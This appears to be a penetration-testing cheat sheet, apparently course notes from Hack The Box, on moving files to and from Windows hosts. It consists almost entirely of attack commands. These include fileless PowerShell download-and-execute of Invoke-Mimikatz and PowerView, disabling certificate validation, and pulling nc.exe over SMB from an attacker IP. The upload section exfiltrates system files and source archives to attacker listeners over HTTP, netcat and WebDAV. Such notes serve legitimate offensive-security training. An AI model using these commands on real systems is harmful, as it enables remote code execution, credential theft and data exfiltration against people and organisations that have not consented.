# Download Operations

## 1) PowerShell Base64 Encode & Decode
if you have access to terminal using a webshell you can 


- base64 a file that you want to transfer
```bash
$ cat backdoor| base64 -w 0 ; echo
YmFkIHRoaW5ncyBoYXBwZW4gaGVyZQo=


$ md5sum shell
2eebc05b20651f70efb2d195bbdaf2c2  shell
```


- paste it in powershell
```powershell
PS C:\user> [IO.File]::WriteAllBytes("C:\Users\public\Desktop\testing\backdoor",[Convert]::FromBase64String("YmFkIHRoaW5ncyBoYXBwZW4gaGVyZQo="))


PS C:\user> Get-FileHash .\backdoor -Algorithm MD5

Algorithm       Hash                                                                   Path                                 
---------       ----                                                                   ----                                 
MD5             2EEBC05B20651F70EFB2D195BBDAF2C2  
```



**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

## 2) PowerShell HTTP Downloads

### 1) PowerShell DownloadFile Method
```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

### 2) PowerShell DownloadString - Fileless Method
- `IEX` It is a cmdlet used to evaluate or execute a string as a PowerShell command.
```powershell
PS C:\user> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

PS C:\user> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
### 3) PowerShell Invoke-WebRequest
```powershell
PS C:\user> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

PS C:\user> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -UseBasicParsing | IEX
```

if the certificate is not trusted. We can bypass that error with the following command:
```powershell
PS C:\user> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
## 3) PowerShell SMB Downloads
- create smbserver
```bash
sudo /usr/share/doc/python3-impacket/examples/smbserver.py share -smb2support ./shareIsCare

sudo /usr/share/doc/python3-impacket/examples/smbserver.py share -smb2support ./shareIsCare -user test -password test
```
- copy files using powershell
```powershell
PS C:\user> copy \\192.168.220.133\share\nc.exe


PS C:\user> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

PS C:\user> copy n:\nc.exe
        1 file(s) copied.
```
## 4) PowerShell FTP Downloads

```bash
sudo python3 -m pyftpdlib --port 21
```

- Download Using PowerShell
```powershell
PS C:\user> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

- Download using Command File for the FTP Client and Download the Target File
```powershell
C:\user> echo open 192.168.49.128 > ftpcommand.txt
C:\user> echo USER anonymous >> ftpcommand.txt
C:\user> echo binary >> ftpcommand.txt
C:\user> echo GET file.txt >> ftpcommand.txt
C:\user> echo bye >> ftpcommand.txt
C:\user> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\user>more file.txt
This is a test file
```

# Upload Operations

## 1) PowerShell Base64 Encode & Decode

- encode file
```powershell
PS C:\user> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

PS C:\user> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```
- paste it to decode
```bash
KiroMaged@htb[/htb]$ echo <base64>| base64 -d > hosts
```

## 2) PowerShell HTTP Upload

### Invoke-FileUpload to Python Upload Server
- listen 
```bash
$ python3 -m uploadserver 9999
File upload available at /upload
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...

```
-  send req
```powershell
PS C:\user> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\user> Invoke-FileUpload -Uri http://172.24.121.19:9999/upload -File C:\Windows\System32\drivers\etc\hosts

```

### PowerShell Base64 Web Upload
- listen  
```bash
$  nc -lvnp 8000
listening on [any] 8000 ...
```
-  send req
```powershell
PS C:\user> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\user> Invoke-WebRequest -Uri http://172.24.121.19:8000/ -Method POST -Body $b64
```

## 3) PowerShell SMB Uploads

- most encrionment will prevent outgoing smb connection so we can use The WebDAV protocol , which enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

- other than that we can use the same method in download section
```bash
$ sudo pip install wsgidav cheroot
$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

```powershell
PS C:\user> dir \\192.168.49.128\DavWWWRoot

PS C:\user> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
